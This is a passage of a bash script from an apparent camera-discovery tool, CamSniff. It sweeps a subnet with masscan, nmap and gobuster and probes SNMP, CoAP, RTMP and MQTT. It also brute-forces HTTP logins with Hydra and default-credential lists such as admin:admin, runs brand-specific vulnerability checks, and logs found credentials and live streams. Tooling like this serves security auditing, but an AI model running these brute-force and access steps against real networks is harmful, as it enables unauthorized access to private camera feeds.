      # Create combo file by combining usernames and passwords
      # Limit to most common combinations for performance (top 10 users × top 15 passwords)
      {
        while IFS= read -r user; do
          [[ "$user" == "__EMPTY__" ]] && user=""
          while IFS= read -r pass; do
            [[ "$pass" == "__EMPTY__" ]] && pass=""
            echo "$user:$pass"
          done < <(head -15 "$SCRIPT_DIR/$PASSWORD_WORDLIST" | grep -v "^#")
        done < <(head -10 "$SCRIPT_DIR/$USERNAME_WORDLIST" | grep -v "^#")
      } >"$combo_file" 2>/dev/null || true
    else
      # Fallback to hardcoded combos
      {
        echo admin:admin
        echo admin:12345
        echo root:root
        echo user:user
        echo guest:guest
        echo admin:
        echo :
      } >"$combo_file" 2>/dev/null || true
    fi
  fi
  if [[ "${ENABLE_BRUTE_FORCE:-0}" -eq 1 ]]; then
    hydra -C "$combo_file" -s "$port" http-get://"$ip" -t "$HYDRA_RATE" &>/dev/null && {
    log "[HYDRA-HTTP] $ip:$port - Access granted"
    log_device_info "$ip" "HTTP authentication bypassed" "web_device"
    }
  fi
  
  # Revolutionary credential bypass techniques
  advanced_credential_bypass "$ip" "$port"
  
  #  server fingerprinting
  hdr=$(curl -sI "http://$ip:$port" 2>/dev/null | grep -i '^Server:' | cut -d' ' -f2-)
  if [[ $hdr ]]; then
    cve_check "$hdr"
    
    # Enhanced camera brand identification with specific vulnerability checks
    case $hdr in
      *Hikvision*|*HIKVISION*) 
        log_device_info "$ip" "Hikvision Camera: $hdr" "hikvision_camera"
        check_hikvision_vulns "$ip" "$port"
        ;;
      *Dahua*|*DAHUA*) 
        log_device_info "$ip" "Dahua Camera: $hdr" "dahua_camera"
        check_dahua_vulns "$ip" "$port"
        ;;
      *Axis*|*AXIS*) 
        log_device_info "$ip" "Axis Camera: $hdr" "axis_camera"
        check_axis_vulns "$ip" "$port"
        ;;
      *Vivotek*|*VIVOTEK*) 
        log_device_info "$ip" "Vivotek Camera: $hdr" "vivotek_camera"
        check_vivotek_vulns "$ip" "$port"
        ;;
      *Foscam*|*FOSCAM*) 
        log_device_info "$ip" "Foscam Camera: $hdr" "foscam_camera"
        check_foscam_vulns "$ip" "$port"
        ;;
      *D-Link*|*DLINK*) 
        log_device_info "$ip" "D-Link Camera: $hdr" "dlink_camera"
        check_dlink_vulns "$ip" "$port"
        ;;
      *TP-Link*|*TPLINK*) 
        log_device_info "$ip" "TP-Link Camera: $hdr" "tplink_camera"
        check_tplink_vulns "$ip" "$port"
        ;;
      *Sony*|*SONY*) 
        log_device_info "$ip" "Sony Camera: $hdr" "sony_camera"
        check_sony_vulns "$ip" "$port"
        ;;
      *) 
        log_device_info "$ip" "HTTP Server: $hdr" "web_server"
        # Generic camera detection based on response patterns
        detect_generic_camera "$ip" "$port"
        ;;
    esac
  fi

  # Aggressive directory brute-forcing for cameras
  log_debug "Starting camera-specific directory scan on $ip:$port"
  if command -v gobuster &>/dev/null; then
    gobuster dir -u "http://$ip:$port" -w "$DIRB_WORDLIST" -q -o "$OUTPUT_DIR/logs/dirb_${ip}_${port}.txt" 2>/dev/null &
  fi
}

# Function to scan SNMP ( for aggressive scanning)
scan_snmp(){
  for com in "${SNMP_COMM_ARRAY[@]}"; do
    out=$(snmpwalk -v2c -c "$com" -Ovq -t1 -r0 "$1" sysDescr.0 2>/dev/null)
    [[ $out ]] && { log "[SNMP] $1 ($com) → $out"; cve_check "$out"; break; }
  done

  # Aggressive SNMP brute-forcing
  log "[SNMP-BRUTE] Starting SNMP brute-force on $1"
  onesixtyone -c "$SNMP_COMM_FILE" "$1" &>/dev/null && log "[SNMP-BRUTE] Results saved to /tmp/snmp_brute_$1.log"
}

# Function to scan CoAP ( for aggressive scanning)
scan_coap(){
  if command -v coap-client &>/dev/null; then
    for p in .well-known/core media stream status; do
      out=$(timeout 3 coap-client -m get -s 2 "coap://$1/$p" 2>/dev/null)
      [[ $out ]] && log "[CoAP] coap://$1/$p → ${out:0:80}"
    done
  else
    log "[CoAP] coap-client not available, skipping detailed CoAP enumeration"
  fi

  # Aggressive CoAP fuzzing (optional)
  if command -v coap-fuzzer &>/dev/null; then
    log "[FUZZ] Starting CoAP fuzzing on $1"
    coap-fuzzer -u "coap://$1" -o "/tmp/coap_fuzz_$1.log" &>/dev/null && log "[FUZZ] Results saved to /tmp/coap_fuzz_$1.log"
  else
    log "[FUZZ] coap-fuzzer not available, skipping CoAP fuzzing"
  fi
}

# Function to scan RTMP ( for aggressive scanning)
scan_rtmp(){
  for p in live/stream live cam play h264; do
    u="rtmp://$1/$p"
    timeout 4 rtmpdump --timeout 2 -r "$u" --stop 1 &>/dev/null && { log "[RTMP] $u"; add_stream "$u"; }
  done

  # Aggressive RTMP fuzzing (optional)
  if command -v rtmp-fuzzer &>/dev/null; then
    log "[FUZZ] Starting RTMP fuzzing on $1"
    rtmp-fuzzer -u "rtmp://$1" -o "/tmp/rtmp_fuzz_$1.log" &>/dev/null && log "[FUZZ] Results saved to /tmp/rtmp_fuzz_$1.log"
  else
    log "[FUZZ] rtmp-fuzzer not available, skipping RTMP fuzzing"
  fi
}

# Function to scan MQTT
scan_mqtt(){
  log "[MQTT] Starting MQTT scan on $1"
  mosquitto_sub -h "$1" -t "#" -C 1 -W 5 &>/dev/null && log "[MQTT] MQTT broker found on $1"
}

# Function to perform a network sweep (invoked via wrapper in camsniff.sh)
sweep_network(){
  phase "SWEEP START" "Advanced network enumeration (sweep_network)"
  log_debug "Starting advanced sweep (sweep_network)"
  # Start scan animation in background
  # Ensure HOSTS_SCANNED associative array exists (defensive in case sourcing order changed)
  declare -p HOSTS_SCANNED >/dev/null 2>&1 || declare -A HOSTS_SCANNED
  scan_animation &
  local anim_pid=$!
  trap 'kill $anim_pid 2>/dev/null' RETURN

  # Suppress fping and arp-scan output
  phase "HOST DISCOVERY" "fping → alive hosts; fallback arp-scan"
  mapfile -t ALIVE < <(fping -a -g "$SUBNET" 2>/dev/null)
  (( ${#ALIVE[@]} )) || mapfile -t ALIVE < <(arp-scan -l -I "$IF" 2>/dev/null | awk '{print $1}')
  interim_summary
  # Re-enable animation after phase banner
  PHASE_ACTIVE=0

  if (( FIRST_RUN )); then
    phase "MASSCAN (INITIAL)" "Full subnet: $SUBNET ports=$PORTS rate=$MASSCAN_RATE"
    log "First-run masscan…"
    mapfile -t SCAN < <(masscan "$SUBNET" -p"$PORTS" --rate "$MASSCAN_RATE" -oL - 2>/dev/null | awk '/open/ {print $4":"$2}')
    FIRST_RUN=0
  else
    NEW=()
    for ip in "${ALIVE[@]}"; do
      [[ -z ${HOSTS_SCANNED[$ip]+x} ]] && NEW+=("$ip")
    done
    if ((${#NEW[@]})); then
      phase "MASSCAN (DELTA)" "New hosts: ${NEW[*]}"
      log "Masscan new: ${NEW[*]}"
      mapfile -t SCAN < <(masscan "${NEW[@]}" -p"$PORTS" --rate "$MASSCAN_RATE" -oL - 2>/dev/null | awk '/open/ {print $4":"$2}')
    else
      SCAN=()
    fi
  fi
  interim_summary
  PHASE_ACTIVE=0

  phase "PORT/PROTOCOL DISPATCH" "Scanning identified open service endpoints"
  for e in "${SCAN[@]}"; do
    ip=${e%%:*}; port=${e#*:}
    HOSTS_SCANNED["$ip"]=1
    case $port in
      554|8554|10554|5544|1055) scan_rtsp "$ip" "$port" ;;
      80|8080|8000|81|443)      scan_http "$ip" "$port" ;;
      161)                      scan_snmp "$ip"    ;;
      1883|8883)                scan_mqtt "$ip"    ;;
    esac
  done
  interim_summary
  PHASE_ACTIVE=0

  # Optional targeted nmap vuln scripts on identified devices
  if [[ "${ENABLE_NMAP_VULN:-0}" -eq 1 && ${#HOSTS_SCANNED[@]} -gt 0 ]]; then
    log "Running targeted nmap vuln scan on discovered hosts"
    local target_list=()
    for h in "${!HOSTS_SCANNED[@]}"; do target_list+=("$h"); done
    nmap -Pn -T3 --script vuln,default -oN "$OUTPUT_DIR/logs/nmap_vuln_$(date +%H%M%S).txt" "${target_list[@]}" >/dev/null 2>&1 || true
  fi

  phase "SERVICE DISCOVERY" "ONVIF / SSDP"
  discover_onvif; discover_ssdp
  interim_summary
  PHASE_ACTIVE=0

  phase "COAP ENUM"; for ip in "${ALIVE[@]}"; do scan_coap "$ip"; done; interim_summary
  PHASE_ACTIVE=0
  phase "RTMP ENUM"; for ip in "${ALIVE[@]}"; do scan_rtmp "$ip"; done; interim_summary
  PHASE_ACTIVE=0

  phase "SCREENSHOTS & AI"
  log "Screenshot + AI…"
  for u in "${!STREAMS[@]:-}"; do screenshot_and_analyze "$u"; done

  phase "SUMMARY REPORT"
  log "Generating summary report…"
  generate_summary_report

  phase "MOSAIC"
  log "Mosaic…"
  launch_mosaic

  phase "TUI"
  log "TUI…"
  if (( ${#STREAMS[@]:-0} )) && command -v fzf &>/dev/null; then
    printf "%s\n" "${!STREAMS[@]:-}" | fzf --prompt="Select> " | xargs -r -I{} ffplay -loglevel error "{}"
  fi

  run_plugins

  # Stop scan animation and clear line
  kill "$anim_pid" 2>/dev/null
  printf "\r\033[K"
}

# Generate  summary report
generate_summary_report(){
  local report_file
  local json_file
  report_file="$OUTPUT_DIR/reports/summary_$(date +%Y%m%d_%H%M%S).txt"
  json_file="$OUTPUT_DIR/reports/summary_$(date +%Y%m%d_%H%M%S).json"
  
  {
    echo "=============================================="
  CAMSNIFF_VERSION=${CAMSNIFF_VERSION:-$(cat "$(dirname "$SCRIPT_DIR")/VERSION" 2>/dev/null || echo "dev")}
  echo "CamSniff ${CAMSNIFF_VERSION} -  Camera Discovery"
    echo "Scan completed: $(date)"
    echo "=============================================="
    echo
    echo "CAMERAS FOUND: ${#CAMERAS_FOUND[@]}"
    echo "DEVICES IDENTIFIED: ${#DEVICE_INFO[@]}"
    echo "ACTIVE STREAMS: ${#STREAMS[@]:-0}"
    echo
    
    if (( ${#CAMERAS_FOUND[@]} > 0 )); then
      echo "DISCOVERED CAMERAS:"
      echo "-------------------"
      for key in "${!CAMERAS_FOUND[@]}"; do
        IFS='|' read -ra info <<< "${CAMERAS_FOUND[$key]}"
        echo "  • $key - Protocol: ${info[0]}, URL: ${info[1]}, Creds: ${info[2]:-None}"
      done
      echo
    fi
    
    if (( ${#DEVICE_INFO[@]} > 0 )); then
      echo "DEVICE INFORMATION:"
      echo "-------------------"
      for key in "${!DEVICE_INFO[@]}"; do
        IFS='|' read -ra info <<< "${DEVICE_INFO[$key]}"
        echo "  • $key - Type: ${info[0]}, Info: ${info[1]}"
      done
      echo
    fi
    
    echo "OUTPUT DIRECTORY: $OUTPUT_DIR"
    echo "- Screenshots: $OUTPUT_DIR/screenshots/"
    echo "- Logs: $OUTPUT_DIR/logs/"
    echo "- Reports: $OUTPUT_DIR/reports/"
    echo
    echo "=============================================="
  } | tee "$report_file"
  
  # Generate JSON summary
  {
    echo "{"
    echo "  \"scan_info\": {"
  # Embed runtime version dynamically
  echo "    \"version\": \"${CAMSNIFF_VERSION:-dev}\"," 
    echo "    \"timestamp\": \"$(date -Iseconds)\","
    echo "    \"output_dir\": \"$OUTPUT_DIR\""
    echo "  },"
    echo "  \"statistics\": {"
    echo "    \"cameras_found\": ${#CAMERAS_FOUND[@]},"
    echo "    \"devices_identified\": ${#DEVICE_INFO[@]},"
    echo "    \"active_streams\": ${#STREAMS[@]:-0}"
    echo "  },"
    echo "  \"cameras\": ["
    
    local first=1
    for key in "${!CAMERAS_FOUND[@]}"; do
      IFS='|' read -ra info <<< "${CAMERAS_FOUND[$key]}"
      IFS=':' read -ra addr <<< "$key"
      
      [[ $first -eq 0 ]] && echo ","
      echo -n "    {"
      echo -n "\"ip\": \"${addr[0]}\", "
      echo -n "\"port\": \"${addr[1]}\", "
      echo -n "\"protocol\": \"${info[0]}\", "
      echo -n "\"url\": \"${info[1]}\", "
      echo -n "\"credentials\": \"${info[2]:-}\""
      echo -n "}"
      first=0
    done
    
    echo
    echo "  ],"
    echo "  \"devices\": ["
    
    first=1
    for key in "${!DEVICE_INFO[@]}"; do
      IFS='|' read -ra info <<< "${DEVICE_INFO[$key]}"
      
      [[ $first -eq 0 ]] && echo ","
      echo -n "    {"
      echo -n "\"ip\": \"$key\", "
      echo -n "\"type\": \"${info[0]}\", "
      echo -n "\"info\": \"${info[1]}\""
      echo -n "}"
      first=0
    done
    
    echo
    echo "  ]"
    echo "}"
  } > "$json_file"
  
  log "Summary report saved: $report_file"
  log "JSON report saved: $json_file"
}

# Add trap to terminate scan_animation safely
scan_animation() {
  # Respect NO_ANIM and non-interactive environments
  if [[ "${NO_ANIM:-0}" == "1" || ! -t 1 || "${PHASE_ACTIVE:-0}" == 1 ]]; then
    echo -en "Scanning..."
    return 0
  fi

  local len=10
  local reset='\033[0m'
  local red='\033[31m'
  local stop_anim=0

  cleanup() {
    # shellcheck disable=SC2317
    # Clear the line and move to next line
  echo -en "\r\033[K"
  # shellcheck disable=SC2317
  trap - INT TERM EXIT
  # shellcheck disable=SC2317
  stop_anim=1
  }

  trap cleanup INT TERM EXIT

  while :; do
    (( stop_anim == 1 )) && break
    for ((i=0; i<len; i++)); do
      (( stop_anim == 1 )) && break
      local line=""
      for ((j=0; j<len; j++)); do
        if (( j == i )); then
          line+="${red}•${reset}"
        else
          line+="·"
        fi
      done
      echo -en "\rScanning... $line"
      sleep 0.1
    done
  done
}
